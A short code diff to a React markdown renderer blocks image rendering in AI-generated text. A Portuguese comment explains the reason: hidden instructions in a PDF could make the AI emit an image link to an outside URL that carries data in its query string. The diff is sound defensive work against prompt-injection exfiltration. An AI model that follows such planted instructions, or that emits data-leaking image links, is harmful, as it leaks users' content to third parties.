@@ -17,6 +17,9 @@ function MarkdownImpl({ children }: { children: string }) {
             </div>
           ),
           a: ({ node: _n, ...props }) => <a {...props} target="_blank" rel="noreferrer noopener" />,
+          // texto da IA nunca carrega imagem: um PDF com instruções escondidas poderia pedir
+          // ![](https://site/?dados=...) e vazar conteúdo só de abrir o resumo ou o chat
+          img: () => null,
         }}
       >
         {normalizeMarkdown(children)}
